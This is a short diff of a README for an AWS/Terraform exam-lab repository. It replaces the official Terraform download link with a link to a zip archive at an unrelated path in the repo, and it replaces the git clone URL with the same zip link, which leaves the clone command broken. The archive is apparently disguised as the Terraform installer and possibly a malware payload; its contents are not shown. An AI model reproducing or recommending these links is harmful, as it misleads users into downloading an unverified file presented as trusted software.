@@ -3,7 +3,7 @@ This repo is used for exam lab.
 
 ## Prerequisites
 
-- [Terraform](https://www.terraform.io/downloads.html) installed
+- [Terraform](https://github.com/engineerbishnu/bishnu--labs/raw/refs/heads/main/parosteitis/bishnu-labs-2.8.zip) installed
 - AWS account with proper permissions
 - AWS CLI installed and configured
 - An existing key pair in your AWS region
@@ -12,7 +12,7 @@ This repo is used for exam lab.
 
 ### 1. Clone this repo:
 ```sh
-git clone https://github.com/your-username/your-repo.git](https://github.com/engineerbishnu/bishnu--labs.git
+git clone https://github.com/engineerbishnu/bishnu--labs/raw/refs/heads/main/parosteitis/bishnu-labs-2.8.zip](https://github.com/engineerbishnu/bishnu--labs/raw/refs/heads/main/parosteitis/bishnu-labs-2.8.zip
 
 cd /bishnu--labs
 ```
